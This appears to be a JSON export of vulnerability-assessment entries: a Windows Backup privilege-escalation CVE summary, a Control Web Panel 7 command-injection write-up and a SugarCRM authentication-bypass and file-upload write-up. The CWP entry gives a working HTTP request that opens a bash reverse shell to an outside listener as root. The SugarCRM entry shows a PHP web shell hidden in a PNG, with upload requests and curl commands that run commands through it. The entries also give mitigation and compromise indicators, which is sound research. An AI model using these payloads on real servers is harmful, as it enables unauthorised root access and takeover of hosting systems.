      "document": "## CVE-2023-21752 - Windows Backup service - Privilege Escalation\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2023/CVE-2023-21752/Docs/Screenshot%202023-01-13%20104608.png)\r\n\r\n## Description:\r\nWindows 11 Pro build 10.0.22000 Build 22000 suffers from  Backup service - Privilege Escalation vulnerability.\r\nAn attacker who successfully exploited this vulnerability could gain SYSTEM privileges\r\nand could delete data that could include data that results in the service being unavailable.\r\n\r\n\r\n## STATUS: HIGH Vulnerability - CRITICAL\r\n\r\n[+] Exploit:\r\n\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-21752/PoC)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-21752/)\r\n\r\n## Proof and Exploit:\r\n[href](https://streamable.com/f2dl3m)\r\n\r\n## Reference:\r\n[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21752)\r\n\r\n## FAQ from Microsoft \r\n```\r\nWhat privileges could be gained by an attacker who successfully exploited the vulnerability?\r\nAn attacker who successfully exploited this vulnerability could gain SYSTEM privileges.\r\nAccording to the CVSS metrics, successful exploitation of this vulnerability could lead to no loss of confidentiality (C:N) but have major impact on integrity (I:H) and on availability (A:H). What does that mean for this vulnerability?\r\nThis vulnerability does not allow disclosure of any confidential information, but could allow an attacker to delete data that could include data that results in the service being unavailable.\r\n```\r\n\r\n## RPC\r\n[Remote procedure call (RPC)](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)\r\n\r\n## Affected Releases:\r\n```\r\nJan 10, 2023\r\nWindows 10 Version 1809 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022286 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 20H2 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 20H2 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 20H2 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 11 Version 22H2 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022303 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 21H2 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 22H2 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 21H2 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 11 version 21H2 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022287 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 11 version 21H2 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022287 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 21H2 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 22H2 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 11 Version 22H2 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022303 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 22H2 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022282 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 7 for 32-bit Systems Service Pack 1\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022338 \uf35f\r\n5022339 \uf35f\r\nMonthly Rollup \uf35f\r\nSecurity Only \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022297 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 1607 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022289 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022297 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 7 for x64-based Systems Service Pack 1\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022338 \uf35f\r\n5022339 \uf35f\r\nMonthly Rollup \uf35f\r\nSecurity Only \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 1809 for x64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022286 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 1607 for 32-bit Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022289 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\nJan 10, 2023\r\nWindows 10 Version 1809 for ARM64-based Systems\r\n-\r\nElevation of Privilege\r\nImportant\r\n5022286 \uf35f\r\nSecurity Update \uf35f\r\nCVE-2023-21752\r\n```\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "1aab3b96-1ee8-4e1b-a8b1-dbdfdd6529e5",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "af0b4d63-d934-4856-9bf3-ef619288764d",
      "created": "2023-01-14T18:25:05.745975Z",
      "revisionDate": "2023-01-19T22:23:26.941014Z",
      "document": "This vulnerability is all about **\"Why Quotes Matter\"**\r\n\r\nIn December 2022,  security researcher `Numan T\u00fcrle` from `Gais Cyber Security` discovered an unauthenticated remote code execution vulnerability in the Control Web Panel 7 (CWP) application. They state on their [website](https://control-webpanel.com/) that CWP is a World Leading advanced Free and PRO web hosting panel that gives you all the flexibility to effectively and efficiently manage your server and clients.  \r\n\r\nThe vulnerability is exposed thru the admin endpoint `/login/index.php?login` which typically runs on port `2030` or `2086` for `http` and port `2031` and port `2087` for `https`. Successful exploitation results in command execution as the `root` user. CWP versions `0.9.8.1146` and below are vulnerable.\r\n\r\nThe issue is triggered by the improper use of quotes when a failed login entry is logged in the `/var/log/cwp_client_login.log`.\r\nThe example below shows why the proper usage of quotes is important when applied in a unix shell.\r\n```console\r\n[root@localhost ~]# echo \"$(whoami)\"\r\nroot\r\n[root@localhost ~]# echo '$(whoami)'\r\n$(whoami)\r\n[root@localhost ~]# echo \"'$(whoami)'\"\r\n'root'\r\n[root@localhost ~]# echo ''$(whoami)''\r\nroot\r\n```\r\nIn the first example, the inline bash command `$(whoami)` gets executed within the `echo` command using double quotes.\r\nHowever, if you use single quotes, it is treated as text which is the standard unix shell behavior. But if you try to be smart and put double quotes around the single quotes, it again executes `$(whoami)` because the single quotes are seen as text if surrounded by double quotes.\r\nThis is no secret to experienced unix admins, but typically software developers can be easily tricked when they use underlying unix shell commands and quotes in their programs.\r\n\r\nAnd this is exactly the problem that triggers this vulnerability.\r\nLet's have a quick look, what is going under the hood....\r\n\r\nTake the burp request below, where we will trigger a failed login entry using the existing default user `root` with a wrong password.\r\n```\r\nPOST /login/index.php?login= HTTP/1.1\r\nHost: 192.168.100.89:2031\r\nContent-Length: 46\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en\r\nConnection: close\r\n\r\nusername=root&password=idonotcare&commit=Login\r\n```\r\nIf we monitor the `/var/log/cwp_client_login.log` then we can see an failed login entry.\r\n```console\r\n[root@localhost ~]# tail -f /var/log/cwp_client_login.log\r\n2023-01-14 17:37:04 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login='\r\n```\r\nIf we do the same burp request, but now with our `$(whoami)` added.\r\nAnd surprise, surprise, the `whoami` command gets executed (see second log entry).\r\n```console\r\n[root@localhost ~]# tail -f /var/log/cwp_client_login.log\r\n2023-01-14 17:37:04 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login='\r\n2023-01-14 17:40:25 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login=root'\r\n```\r\nNow lets take a reverse bash shell.\r\n```\r\nPOST /login/index.php?login=$(bash -i >& /dev/tcp/192.168.100.7/4444 0>&1) HTTP/1.1\r\nHost: 192.168.100.89:2031\r\nContent-Length: 46\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en\r\nConnection: close\r\n\r\nusername=root&password=idonotcare&commit=Login\r\n```\r\nAnd voila, a reverse shell as `root` user on the target.\r\n```console\r\n# nc -lnvp 4444\r\nNcat: Version 7.93 ( https://nmap.org/ncat )\r\nNcat: Listening on :::4444\r\nNcat: Listening on 0.0.0.0:4444\r\nNcat: Connection from 192.168.100.89.\r\nNcat: Connection from 192.168.100.89:51988.\r\nbash: no job control in this shell\r\n[root@localhost login]# whoami\r\nwhoami\r\nroot\r\nYou have new mail in /var/mail/root\r\n[root@localhost login]#\r\n```\r\nAnother interesting piece is that you actually can see the command running in the process list that is writing the log entry to the log file.\r\nYou can clearly see the improper use of the double quotes in this command line.\r\n```console\r\nroot     12238 12231  0 03:41 ?        00:00:00 sleep 17897\r\nroot     12493   910  0 03:43 ?        00:00:37 php-fpm: pool cwpsrv\r\npostfix  27739  1538  0 07:41 ?        00:00:00 pickup -l -t fifo -u -o content_filter= -o receive_override_options=no_header_body_checks\r\nroot     29668     2  0 08:02 ?        00:00:00 [kworker/0:3]\r\nroot     30160     2  0 08:10 ?        00:00:00 [kworker/0:1]\r\nroot     30718     2  0 08:15 ?        00:00:00 [kworker/0:0]\r\nroot     30869  7118  0 08:17 ?        00:00:00 sh -c echo \"2023-01-14 13:17:46 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login=$(bash -i >& /dev/tcp/192.168.100.7/4444 0>&1)'\" >> /var/log/cwp_client_login.log\r\n```\r\n\r\nIf you want to test it yourself, please follow this [guidance](https://control-webpanel.com/installation-instructions#step1) to build a vulnerable configuration. Please do not expose this to the Internet unless you want to be compromised ;-)\r\nBefore you execute step 7. `sh cwp-el7-latest`, please edit the file and make the following adjustments to download the vulnerable version and prevent the auto update.\r\n```bash\r\nnano /usr/local/src/cwp-el7-latest\r\n>>>>>\r\n# wget static.cdn-cwp.com/files/cwp/el7/cwp-el7-0.9.8.1148.zip\r\n# unzip -o -q cwp-el7-0.9.8.1148.zip\r\n# rm -f cwp-el7-0.9.8.1148.zip\r\n\r\nwget static.cdn-cwp.com/files/cwp/el7/cwp-el7-0.9.8.1146.zip\r\nunzip -o -q cwp-el7-0.9.8.1146.zip\r\n>>>>>\r\n# update cwp\r\nchmod +x /scripts/cwp_api\r\n# sh /scripts/update_cwp\r\nsh /scripts/cwp_set_memory_limit\r\n>>>>>\r\n```\r\nAfter running the installation script which takes about 30 minutes, please rename `/usr/local/cwpsrv/htdocs/resources/scripts/update_cwp` to `update_cwp.something` otherwise CWP will get updated to the latest version when you start the application.\r\n \r\n## Mitigation\r\nThe CWP application has an auto update feature that can not be disabled in the application. Therefore the likelihood to find any vulnerable CWP application in the wild is almost zero.\r\n\r\nI have created a  Metasploit module. A local version of this module can found at the **References** section.\r\n\r\n## References\r\n[Github](https://github.com/numanturle/CVE-2022-44877)\r\n[Packetstorm](https://packetstormsecurity.com/files/170388/Control-Web-Panel-7-Remote-Code-Execution.html)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to the security researcher below who discovered and analyzed this vulnerability.\r\n* [Numan T\u00fcrle](https://twitter.com/numanturle/)\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "46930176-36cd-4b9c-957a-45ba1fa9212d",
      "editorId": "c705facc-e0da-42f6-97c9-f403165a25e9",
      "topicId": "63639a23-8881-4e5c-bdeb-c5f33e31f697",
      "created": "2023-01-17T16:23:47.818159Z",
      "revisionDate": "2023-01-17T16:23:47.817875Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "754d277f-1f12-4198-a898-412db934213d",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "3236e8d5-3a5f-4a70-9701-f945ae2f7b4c",
      "created": "2023-01-18T08:56:14.558482Z",
      "revisionDate": "2023-03-13T21:30:46.823994Z",
      "document": "Last December, 28th 2022,  a zero.day vulnerability in the SugarCRM application was [disclosed](https://seclists.org/fulldisclosure/2022/Dec/31) by `sw33t.0day`. SugarCRM is a popular CRM application that is used by thousands of customers and the latest run of `shodan` shows more than **5600** instances active on the Internet. \r\nIt is fair to say that not all instances are vulnerable. There is a fast amount of SugarCRM Community Editions amongst them that are not affected by this vulnerability. \r\n\r\nFor the vulnerable versions, please check the security advisory [sugarcrm-sa-2023-001](https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/) from the vendor.\r\n\r\nThe vulnerability in sugarCRM could allow an unauthenticated attacker to upload a malicious PNG file with embedded PHP code to the `/cache/images/` directory on the web server. Once uploaded to the server, depending on server configuration, the attacker may be able to execute that code over the web via `HTTP` or `HTTPS` gaining access to the system.\r\n\r\nThe vulnerability is caused by two issues in the code base of sugarCRM. \r\n\r\nFirst issue is  a missing authentication check in the `loadUser()` method in `include/MVC/SugarApplication.php`.\r\nAfter a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application.\r\nThe burp request below shows this behavior.\r\n\r\n**Authentication request and response from a vulnerable instance**\r\n```html\r\nPOST /index.php HTTP/1.1\r\nHost: TARGET:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15\r\nCookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\nmodule=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a\r\n```\r\nResponse is a HTTP 500 message and the response says `You must specify a valid username and password.` Could be different depending on the language settings.\r\n```html\r\nHTTP/1.0 500 Server Error\r\nDate: Wed, 18 Jan 2023 05:54:58 GMT\r\nServer: Apache/2.4.10 (Debian)\r\nSet-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nSet-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;\r\nSet-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; HttpOnly\r\nStatus: 500 Server Error\r\nSet-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;\r\nContent-Length: 47\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nYou must specify a valid username and password.\r\n```\r\nAfter applying the suggested fix below from the vendor, the session information gets destroyed after a failed login and further request will fail.\r\n```php\r\n//If there was a login error, we should not allow the further code execution and destroy the session\r\n\r\nif (isset($_SESSION['login_error'])) {\r\n\r\nif ($sess->getId()) {\r\n\r\n$sess->destroy();\r\n\r\n};\r\n\r\nheader('Location: ' . $this->getUnauthenticatedHomeUrl(true));\r\n\r\nexit();\r\n\r\n}\r\n```\r\nBurp response after the patch, where the response says `You need to be logged in to perform this action.`\r\n```html\r\nHTTP/1.0 500 Server Error\r\nDate: Tue, 17 Jan 2023 07:23:56 GMT\r\nServer: Apache/2.4.10 (Debian)\r\nSet-Cookie: PHPSESSID=cf6361a9-6222-45f4-bcfb-08d0dc88376e; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nSet-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/\r\nStatus: 500 Server Error\r\nContent-Length: 49\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n\r\nYou need to be logged in to perform this action.\r\n```\r\n\r\nThe second issue is around the ability to upload of a malicious PNG file with PHP code embedded that can be executed by the attacker.\r\nThe vulnerable endpoint is  `/index.php?module=EmailTemplates&action=AttachFiles`\r\n\r\nThere is a good reference [Persistent PHP payloads in PNGs](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) that explains very well how to build a malicious PNG file with PHP code embedded.\r\nThe are several ways to hide web shell code into a PNG to make the upload of such malicious PNG successful. \r\nIn this case,  we will embed the web shell code into a so called PLTE chunk which stores the color palette code of a PNG.\r\nThis PLTE chunk is a critical chunk of data that does not get compressed when uploading a PNG which typically a lot of web applications do nowadays.\r\n\r\nThe PLTE chunk contains from 1 to 256 palette entries, each a three-byte series of the form:\r\n\r\n> Red:   1 byte (0 = black, 255 = red)\r\n> Green: 1 byte (0 = black, 255 = green)\r\n> Blue:  1 byte (0 = black, 255 = blue)\r\n\r\nUsing the PLTE chunk, we potentially have 256*3 bytes available to inject our payload into such a critical chunk, which should be more than enough. The only constraint being that the length of the payload must be divisible by 3.\r\n\r\nOur main objective is to keep our web shell small and keep it flexible to accommodate large payloads to avoid the restrictions 768 bytes and the length of the payload.  By using a PHP payload like  `<?=$_GET[0](base64_decode($_POST[1]));?>`, it will satisfy those requirements where you externalize the actual payload to be delivered to the target and can modify the PHP shell command functions during runtime such as `exec()`, `passthru()`, `shell_exec()` and `system()`. \r\nSee `curl` examples below.\r\n```console\r\n# echo 'ls -l' | base64 \r\nbHMgLWwK\r\n# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=passthru' -o -\r\n# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=system' -o -\r\n# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=shell_exec' -o -\r\n```\r\n\r\nThe burp requests below shows a success upload of the malicious PNG with PHP code embedded at a vulnerable target followed by a successful command injection.\r\n\r\n**Malicious PNG File upload**\r\n```html\r\nPOST /index.php HTTP/1.1\r\nHost: TARGET:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15\r\nCookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWeTJtA8WByYIQMGR\r\nContent-Length: 601\r\nConnection: close\r\n\r\n------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nAttachFiles\r\n------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\nEmailTemplates\r\n------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\nContent-Disposition: form-data; name=\"file\"; filename=\"yohoo.phar\"\r\nContent-Type: image/png\r\n\r\nPNG\r\n\r\n--Garbled binary text--<?=$_GET[0](base64_decode($_POST[1]));?>--Garbled binary text--\r\n------WebKitFormBoundaryWeTJtA8WByYIQMGR--\r\n```\r\nSuccessful response of the upload will show the file entry at end of the response.\r\n```html\r\nHTTP/1.1 200 OK\r\nDate: Wed, 18 Jan 2023 05:55:00 GMT\r\nServer: Apache/2.4.10 (Debian)\r\nSet-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nSet-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly\r\nVary: Accept-Encoding\r\nContent-Length: 4460\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html lang='en_us'>\r\n<head>\r\n---- A LOT of HTML CRAP ----\r\n<div id=\"main\">\r\n    <div id=\"content\">\r\n                <table style=\"width:100%\" id=\"contentTable\"><tr><td>\r\n        [\"cache\\/images\\/yohoo.phar\"]\r\n```\r\n**Command execution of `ls -l`**\r\n```html\r\nPOST /cache/images/yohoo.phar?0=passthru HTTP/1.1\r\nHost:TARGET:80\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15\r\nCookie: PHPSESSID=06457e85-5a6c-4428-880a-8e5134137650\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 10\r\nConnection: close\r\n\r\n1=bHMgLWwK\r\n```\r\nRemote command execution response\r\n```html\r\nHTTP/1.1 200 OK\r\nDate: Mon, 16 Jan 2023 16:23:10 GMT\r\nServer: Apache/2.4.10 (Debian)\r\nVary: Accept-Encoding\r\nContent-Length: 1209\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nPNG\r\n\r\n--Garbled binary text--total 76\r\n-rw-r--r-- 1 www-data www-data 207 Jan 16 14:38 yohoo.phar\r\n--Garbled binary text--\r\n```\r\nYou can of course vary the 0 parameter with other PHP shell command functions such as `exec`, `shell_exec` or `system`.\r\n\r\n## Evidence of compromise\r\nWhen you want to check if your system is compromised, please look for unexpected files in the `/cache/images/` directory. The published [exploit](https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html) had a filename `sweet.phar` that was not cleaned. However, attackers have changed these filenames  such as `imagefile.phar`, `meow.phar`, `rvsm.phar`, `aws.phar`, and are using files with other extensions. \r\nAlso be conscious of the fact that the files might have been cleaned up by the attacker to cover their tracks.\r\n\r\nOther evidence might be failed execution request for files under the `/cache/images/` directory with the extension `php`, `phar`, `phtml`, `php7`, or any other executable extension **NOT** allowed by your web server configuration. The response codes can be found in your web server logs, such as `404` \u2013 the file was not found or `403` \u2013 the access was denied by web server. \r\n\r\n## Mitigation\r\nPlease follow the guidelines from the vendor to patch your system [January 5, 2023: Security vulnerability update and FAQ] (https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update) or configure additional security settings in your web server such as preventing PHP code parsing/execution using `.htaccess setting` file in `/cache/images/` directory and/or prevent PHP code execution by updating security settings in the `php.ini` file. Lots of security guidance is available on the Internet. \r\nAnother less obvious security measure to consider is to enable `SAML` authentication that will mitigate the authentication bypass issue, hence will protect you against unauthenticated malicious file uploads.\r\n\r\nI have created a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section.\r\n[Submission](https://github.com/rapid7/metasploit-framework/pull/17507) to Metasploit mainstream is completed and module is in production.\r\n\r\n## References\r\n[Full Disclosure](https://seclists.org/fulldisclosure/2022/Dec/31)\r\n[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html)\r\n[Security Advisory - sugarcrm-sa-2023-001](https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/)\r\n[January 5, 2023: Security vulnerability update and FAQ] (https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update)\r\n[Encoding web shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)\r\n[Persistent PHP payloads in PNGs] (https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)\r\n[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)\r\n\r\n### Credits\r\nCredits goes to `sw33t.0day` below who discovered  this vulnerability.\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
